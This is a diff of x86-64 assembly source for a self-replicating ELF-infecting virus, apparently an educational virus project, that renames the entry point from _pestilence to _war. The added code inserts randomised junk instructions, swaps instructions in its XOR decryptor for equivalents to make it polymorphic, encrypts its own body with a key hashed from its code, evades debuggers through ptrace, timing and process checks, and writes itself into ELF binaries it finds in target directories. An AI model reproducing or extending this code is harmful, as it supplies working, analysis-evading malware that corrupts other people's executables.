@@ -3,21 +3,119 @@
 default rel
 
 section .text
-    global _pestilence
+    global _war
 
-_pestilence:
+_war:
     PUSH
-    mov rbp, rsp        ; 48 89 e5     mov %rsp,%rbp
+    mov rbp, rsp
     lea rsi, [rel obfu]
+    W_JUNK
+    W_JUNK
     cmp byte [rsi], 0x50
     jne decrypt
+    W_JUNK
+    W_JUNK
     jmp obfu
+
+;-------------------------------------------------------------
+; Return random number % 8 in RAX
+; use rdx, rax, rcx
+;-------------------------------------------------------------
+random_number:
+    xor rdx, rdx
+    rdrand rdx
+    mov rax, rdx
+    xor rdx, rdx
+    mov ecx, 8
+    div ecx
+    mov eax, edx
+    ret
+
+
+;-------------------------------------------------------------
+; parameters = $al
+; return number > 0 && < al
+;-------------------------------------------------------------
+spec_number:
+    cmp al, 0x0
+    je .quit
+    xor rdx, rdx
+    rdrand rdx
+    shr rdx, 4
+    and edx, 15
+    cmp dl, al
+    jl .quit
+    .down:
+        shr dl, 1
+        cmp dl, al
+        jge .down
+    .quit:
+        mov al, dl
+        ret
+
+
+; [0] = n set
+; [1] = n permutable instruction
+; 0xFD = delimiter
+; 0xFE = END of set
+xorpoly:
+db 0x01, 0x05, 0xFD, 0x48, 0x31, 0xd2, 0x90, 0x90, 0x90, 0x90, 0x90, 0xFD, 0xba, 0x00, 0x00, 0x00, 0x00, 0x90, 0x90, 0x90, 0xFD, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x48, 0x92, 0x90, 0xFD, 0x48, 0x29, 0xd2, 0x90, 0x90, 0x90, 0x90, 0x90, 0xFD, 0x48, 0x31, 0xc0, 0x48, 0x89, 0xc2, 0x90, 0x90, 0xFE
+db 0x02, 0x05, 0xFD, 0x48, 0x89, 0xf0, 0x90, 0x90, 0x90, 0x90, 0x90, 0xFD, 0x48, 0x96, 0x48, 0x89, 0xc6, 0x90, 0x90, 0x90, 0xFD, 0x48, 0x31, 0xc0, 0x48, 0x01, 0xf0, 0x90, 0x90, 0xFD, 0x48, 0x29, 0xc0, 0x48, 0x01, 0xf0, 0x90, 0x90, 0xFD, 0x56, 0x58, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0xFE
+db 0x03, 0x05, 0xFD, 0x48, 0x89, 0xf9, 0x90, 0x90, 0x90, 0x90, 0x90, 0xFD, 0x48, 0x87, 0xcf, 0x48, 0x89, 0xcf, 0x90, 0x90, 0xFD, 0x57, 0x59, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0xFD, 0x48, 0x29, 0xc9, 0x48, 0x89, 0xf9, 0x90, 0x90, 0xFD, 0x48, 0x31, 0xc9, 0x48, 0x89, 0xf9, 0x90, 0x90, 0xFE
+db 0x04, 0x03, 0xFD, 0x48, 0x83, 0xc0, 0x01, 0x90, 0x90, 0x90, 0x90, 0xFD, 0x48, 0xff, 0xc0, 0x90, 0x90, 0x90, 0x90, 0x90, 0xFD, 0xba, 0x01, 0x00, 0x00, 0x00, 0x48, 0x01, 0xd0, 0xFE
+
+;-------------------------------------------------------------
+; RDI = addr to search / replace for
+; this replace each starting point of XORCipher with equvalent
+; instructions
+;-------------------------------------------------------------
+repl:
+    sub rsp, 56
+    mov [rsp], rdi
+    mov [rsp + 8], rdi
+    mov [rsp + 16], rdi
+    mov [rsp + 24], rdi
+    mov qword [rsp + 32], 0
+    add qword [rsp], (FAMINE_SIZE - (XOR_RJ0))
+    add qword [rsp + 8], (FAMINE_SIZE - (XOR_RJ1))
+    add qword [rsp + 16], (FAMINE_SIZE - (XOR_RJ2))
+    add qword [rsp + 24], (FAMINE_SIZE - (XOR_RJ4))
+    lea rsi, [rel xorpoly]
+    xor rax, rax
+    .replace:
+        mov al, byte [rsi + 1]
+        add rsi, 3
+        call spec_number
+        movzx rcx, al
+        add rsi, rcx
+        shl rcx, 3
+        add rsi, rcx
+        mov rcx, [rsp + 32]
+        mov rdi, [rsp + rcx * 8]
+        xor rcx, rcx
+        .ok:
+            mov al, byte [rsi + rcx]
+            mov byte [rdi + rcx], al
+            inc rcx
+            cmp rcx, 8
+            jne .ok
+        .loop:
+            inc rsi
+            cmp byte [rsi], 0xFE
+            jne .loop
+        inc rsi
+        inc qword [rsp + 32]
+        cmp qword [rsp + 32], 0x4
+        jne .replace
+    add rsp, 56
+    ret
 
 ;-------------------------------------------------------------
 ; PARAMS = rdi = KEY
 ; store in [RSP] key in string
 ;-------------------------------------------------------------
 key_to_string:
+    W_JUNK
     xor rcx, rcx
     jmp .cond
     .number:
@@ -44,8 +142,6 @@ key_to_string:
 
 ; The key can be to length 16 and it should be the sum of every instructions
 ; https://eli.thegreenplace.net/2011/01/27/how-debuggers-work-part-2-breakpoints <-- god tiers
-
-
 ;-------------------------------------------------------------
 ; PARAMS => rdi = addr, rdx = size
 ; Generate a hash with FROM addr to addr + size 
@@ -77,33 +173,62 @@ fnv:
 
 ;-------------------------------------------------------------
 ; Params = rdi = addr, rsi = key(hash), rdx = addr len, rcx = keylen
-; Encrypt data using key
+; Encrypt data using KEY
+; Small metamorphique entry.
 ;-------------------------------------------------------------
 XORCipher:
-    sub rsp, 16
-    mov [rsp], ecx
-    mov [rsp + 4], edx
-    mov qword [rsp + 8], 0
-    .xor_loop:
-        xor rdx, rdx
-        mov rax, [rsp + 8]
-        div dword [rsp] ; edx = %
-        mov rax, rsi
+    sub rsp, 32
+    mov [rsp + 16], ecx
+    mov [rsp + 20], edx
+    mov qword [rsp + 24], 0
+    jmp RJ0
+RJ0:
+        xor rdx, rdx                ;MUTABLE
+        db 0x90, 0x90, 0x90, 0x90, 0x90
+        ; sub rdx, rdx
+        mov rax, [rsp + 24]
+        W_JUNK
+        div dword [rsp + 16]
+        W_JUNK
+        jmp RJ1
+RJ1:
+        mov rax, rsi                ;MUTABLE
+        db 0x90, 0x90, 0x90, 0x90, 0x90
         add rax, rdx
+        W_JUNK
         movzx edx, byte [rax]
-        mov rcx, rdi
-        add rcx, [rsp + 8]
+        W_JUNK
+        jmp RJ2
+RJ2:
+        mov rcx, rdi                ;MUTABLE
+        db 0x90, 0x90, 0x90, 0x90, 0x90
+        add rcx, [rsp + 24]
+        W_JUNK
         movzx ecx, byte [rcx]
+        W_JUNK
         xor edx, ecx
-        mov rax, [rsp + 8]
+        mov rax, [rsp + 24]
+        W_JUNK
+        W_JUNK
         lea rcx, [rdi + rax]
         mov byte [rcx], dl
-        mov rax, [rsp + 8]
-        add rax, 1
-        mov [rsp + 8], rax
-        cmp eax, [rsp + 4]
-        jb .xor_loop
-    add rsp, 16
+        W_JUNK
+        mov rax, [rsp + 24]
+        jmp RJ4
+RJ4:
+        add rax, 1                  ;MUTABLE
+        db 0x90, 0x90, 0x90, 0x90
+        W_JUNK
+        W_JUNK
+        jmp RJ5
+        W_JUNK
+RJ5:
+        mov [rsp + 24], rax
+        cmp eax, [rsp + 20]
+        jb RJ0
+        jmp RJ6
+RJ6:
+    add rsp, 32
     ret
 
 ;-------------------------------------------------------------
@@ -118,7 +243,7 @@ decrypt:
     mov rdx, 7  ; int prot PROT_READ|PROT_WRITE|PROT_EXEC
     mov rax, 10 ; mprotect
     syscall
-    lea rdi, [rel _pestilence]
+    lea rdi, [rel _war]
     mov rdx, (FAMINE_SIZE - (CHUNKS_SIZE))
     call fnv            ; key in rax
     mov rdi, rax
@@ -141,9 +266,12 @@ decrypt:
 ; ack so the ret will jump where we want
 ;-------------------------------------------------------------
 obfu:
-    push rax                    ; 50  push   %rax
-    push rcx                    ; 51  push   %rcx
+    push rax                    ; 50
+    push rcx                    ; 51
+    W_JUNK
     push rdx
+    W_JUNK
+
     mov rcx, rsp
     mov rsp, rbp                ; reset stack frame
     pop rbp                     ; orignal  bp
@@ -156,6 +284,8 @@ obfu:
 ;-------------------------------------------------------------
 ; actual obfuscation, this will not be executed
 ; We're messing arround the control graph 
+; / ! \ as we previously defined + 84, remember to change this
+; if we add more code below
 ;-------------------------------------------------------------
 ahahahaha:
     push rbp
@@ -234,14 +364,9 @@ db 0xD9 ; SIB following MOD-REG-R/M
 ; - time elapsed between 2 block of codes
 ; - If specific process is running, in our case ('test')
 ;-------------------------------------------------------------
-
 begin:
     pop rax
     sub rsp, FILE_SIZE + DIRENT + FSTAT + ENTRY + MAPPED_FILE
-
-; ANTI DEBUG 2
-    rdtsc                           ; get timestamp (EDX(high) - EAX(low))
-    mov dword [rsp + 124], eax 
 
 ;-------------------------------------------------------------
 ; Fork and check if we're the tracers
@@ -368,7 +493,9 @@ child_wait:
 anti_process:
 ; little obfuscation to prevent literal strings in analysis
     mov rcx, 0x252345603525
+    W_JUNK
     mov rax, 0x0a402a123b0a
+    W_JUNK
     add rax, rcx        
     mov [rsp], rax              ; rax = '/proc/'
     lea rdi, [rsp]
@@ -490,6 +617,9 @@ proc_found:
     mov [rsp + 40], word 1
 
 clean_anti_process:
+; ANTI DEBUG 2
+    rdtsc                           ; get timestamp (EDX(high) - EAX(low))
+    mov dword [rsp + 124], eax 
     mov rdi, r14
     mov rax, SYS_CLOSE
     syscall
@@ -509,7 +639,9 @@ clean_anti_process:
     rdtsc                       ; get another timestamp
     mov ecx, dword [rsp + 124]  ; last timestamp save
 	sub eax, ecx                ; compute elapsed ticks
-	cmp eax, 0xFFFFFF
+    cmp eax, 0
+    jl clean
+	cmp eax, 0x13880            ; top block take arround 0x6000 ~ 0x11000
 	jl launch
     jmp clean
 
@@ -542,7 +674,7 @@ open_dir:
     syscall
     cmp rax, 0
     jl next_dir    
-
+    W_JUNK
     mov rdi, rax
     mov rax, SYS_GETDENTS
     mov rsi, rsp
@@ -602,12 +734,14 @@ target_file:
 validate_target:
     lea rdi, [rsp]                                   ; filename
     mov rax, SYS_OPEN
+    W_JUNK
     mov rsi, 0x0                                     ; O_RDONLY
     syscall
     cmp rax, 0
     jle next_file
     mov rdi, rax
     mov r15, rax
+    W_JUNK
     mov rsi, rsp
     add rsi, FILE_SIZE + DIRENT
     mov rax, SYS_FSTAT
@@ -617,6 +751,7 @@ validate_target:
 
 map_target:
     mov rdi, 0x0
+    W_JUNK
     mov rsi, QWORD [rsp + FILE_SIZE + DIRENT + 48]          ; filesz
     mov rdx, 0x3                                            ; READ | WRITE
     mov r10, 0x0002                                         ; MAP_PRIVATE
@@ -645,9 +780,9 @@ elf_header:
 ; File already infected ?
 ;-------------------------------------------------------------
 elf_sign:
-    add rsi, FAMINE_SIZE + 0x6c                             ; offset signature
+    add rsi, (FAMINE_SIZE + ((VAR_LEN + 0xc + 0x40)) - SIG_LEN)               ; offset signature
     lea rdi, [rel hook.SIGN]
-    mov rcx, 38
+    mov rcx, SIG_LEN - 8
     cld
     repe cmpsb
     je clear
@@ -739,37 +874,150 @@ mimic:
     mov r8, rax
 ;write header
     write r8, [rbp - 16], 64
+
 ;-------------------------------------------------------------
-; Encryption
+; Copy code to stack to prepare for poly / meta
 ;-------------------------------------------------------------
-    lea rdi, [rel _pestilence]
-    mov rdx, (FAMINE_SIZE) - (CHUNKS_SIZE)
-    call fnv ; res in RAX
+
     sub rsp, FAMINE_SIZE
     mov rcx, FAMINE_SIZE
-
-    ; Maybe this doesnt word for the rep movsb.?.?
-    lea rsi, [rel _pestilence]
+    lea rsi, [rel _war]
     mov rdi, rsp
     rep movsb ; copy to stack
-; Key to string for RC4
+
+    mov rcx, FAMINE_SIZE
+    xor rax, rax
+
+;-------------------------------------------------------------
+; Search for pattern that match our JUNK to replace them 
+; randomly
+;-------------------------------------------------------------
+poly:
+    cmp byte [rsp + rax], 0x50
+    jl loops
+    cmp byte [rsp + rax], 0x57
+    jg loops
+    cmp byte [rsp + rax + 1], 0x50
+    jl loops
+    cmp byte [rsp + rax + 1], 0x57
+    jg loops
+    cmp byte [rsp + rax + 2], NOP_0
+    jne loops
+    cmp byte [rsp + rax + 3], NOP_1
+    jne loops
+
+;-------------------------------------------------------------
+; JUNK found replace it with randomly value as described with
+; this table 
+; 0x50 + 1 to 7 = REG.
+;      EAX ECX EDX EBX ESP EBP ESI EDI
+;  EAX C0  C8  D0  D8  E0  E8  F0  F8
+;  ECX C1  C9  D1  D9  E1  E9  F1  F9
+;  EDX C2  CA  D2  DA  E2  EA  F2  FA
+;  EBX C3  CB  D3  DB  E3  EB  F3  FB
+;  ESP C4  CC  D4  DC  E4  EC  F4  FC
+;  EBP C5  CD  D5  DD  E5  ED  F5  FD
+;  ESI C6  CE  D6  DE  E6  EE  F6  FE
+;  EDI C7  CF  D7  DF  E7  EF  F7  FF
+;-------------------------------------------------------------
+; ex :  
+;  0xB8 == "mov"
+;  0xB8 + 0xC0 == 0x178 "mov eax, eax"
+; JUNK is as follow [PUSH, PUSH, XCHG, XCHG, POP, POP]
+
+found:
+    push rax
+    push rcx
+    sub rsp, 16
+    .init:
+        call random_number ; use rcx, rax, rdx
+        mov byte [rsp], al
+        mov byte [rsp + 9], al
+        mov byte [rsp + 14], al ; save
+        call random_number
+        mov byte [rsp + 1], al
+        W_JUNK
+        mov byte [rsp + 8], al
+        mov byte [rsp + 15], al ; save
+        cmp al, byte [rsp]
+        je .init
+    add byte [rsp], PUSH_REG          ; 0x50 + n = 0x50..0x57
+    add byte [rsp + 1], PUSH_REG      ; 0x50 + n = 0x50..0x57
+    mov byte [rsp + 2], NOP_0         ; REX.W = 0x48
+    mov byte [rsp + 3], NOP_1         ; 0x87
+    W_JUNK
+    mov byte [rsp + 4], NOP_2         ; 0xC0
+    mov al, byte [rsp + 14]
+    W_JUNK
+    mov cl, byte [rsp + 15]
+    add byte [rsp + 4], al            ; 0xC0 + al = random reg
+    mov al, cl
+    mov cl, 8
+    W_JUNK
+    imul cl
+    add byte [rsp + 4], al            ; 0xC0 + al * 8 = second random reg
+    mov al, [rsp + 2]
+    mov [rsp + 5], al                 ; junk
+    mov al, [rsp + 3]
+    mov [rsp + 6], al                 ; junk
+    mov al, [rsp + 4]
+    mov [rsp + 7], al                 ; junk
+    add byte [rsp + 8], POP_REG
+    add byte [rsp + 9], POP_REG
+    add rsp, 16
+    mov rcx, [rsp + 8]
+    lea rsi, [rsp - 16]
+    mov rdi, rsp
+    add rdi, 16
+    add rdi, rcx
+    mov rcx, 10
+    rep movsb
+    pop rcx
+    pop rax
+loops:
+    add rax, 1
+    dec rcx
+    cmp rcx, 0
+    jne poly
+
+;-------------------------------------------------------------
+; Replace opcode in XORCipher by other opcode that does the 
+; same
+;-------------------------------------------------------------
+polyxor:
+    lea rdi, [rsp]
+    call repl
+
+
+;-------------------------------------------------------------
+; Create Hash based on stack code for decryption of target
+; since code change it is mandatory
+;-------------------------------------------------------------
+create_key:
+    lea rdi, [rsp]
+    mov rdx, (FAMINE_SIZE) - (CHUNKS_SIZE)
+    call fnv ; res in RAX
     mov rdi, rax
     sub rsp, 32
+    W_JUNK
     call key_to_string
     lea rsi, [rsp]  ; key
     add rsp, 32
 
+;-------------------------------------------------------------
+; Encrypt after `obfu` until end
+;-------------------------------------------------------------
+encrypt:
 ; rdx = key
-; rbx = key length
+; rcx = key length
     mov rdx, CHUNKS_SIZE
-    lea rdi, [rsp + (FAMINE_SIZE) - (CHUNKS_SIZE)]      ; File start data to encrypt
+    lea rdi, [rsp + ((FAMINE_SIZE) - (CHUNKS_SIZE))]      ; File start data to encrypt
     call XORCipher
 ;-------------------------------------------------------------
-; Write virus
+; Write himself
 ;-------------------------------------------------------------
     write_rel r8, [rsp], FAMINE_SIZE
     add rsp, FAMINE_SIZE
-
 
 ;-------------------------------------------------------------
 ; First execution of the virus will exit, but executed 
@@ -781,13 +1029,35 @@ mimic:
     mov [rbp - 22], word 0xe0ff                                     ; jmp rax
 ;write vars
     write_rel r8, [rbp - 32], 0xc
-    write_rel r8, [rel hook.folder_1], 74
+    write_rel r8, [rel hook.folder_1], VAR_LEN - 8
 ;-------------------------------------------------------------
-; Write remaining paddng accordnig to page size
+; write PRINGETFRINT
+; It change at every launch
+;-------------------------------------------------------------
+    xor rdx, rdx
+    rdrand rdx
+    xor rcx, rcx
+    shr edx, 4
+    and edx, 15
+    cmp dl, 9
+    jle .down
+    add dl, 55 
+    jmp number
+    .down:
+        add dl, 48
+number:
+    mov byte [rbp - 56 + rcx], dl
+    add rcx, 1
+    cmp rcx, 8
+    jne number
+    mov byte [rsp - 56 + rcx], 0
+    write_rel r8, [rbp - 56], 8
+;-------------------------------------------------------------
+; Write remaining paddng according to page size
 ;-------------------------------------------------------------
     PAGE_ALIGN FAMINE_SIZE
     sub rcx, FAMINE_SIZE
-    sub rcx, 86                                               ; jmp entry + vars
+    sub rcx, VAR_LEN + 0xc                                          ; jmp entry + vars
     mov r9, rcx
 ;-------------------------------------------------------------
 ; IDK if we can optimize that
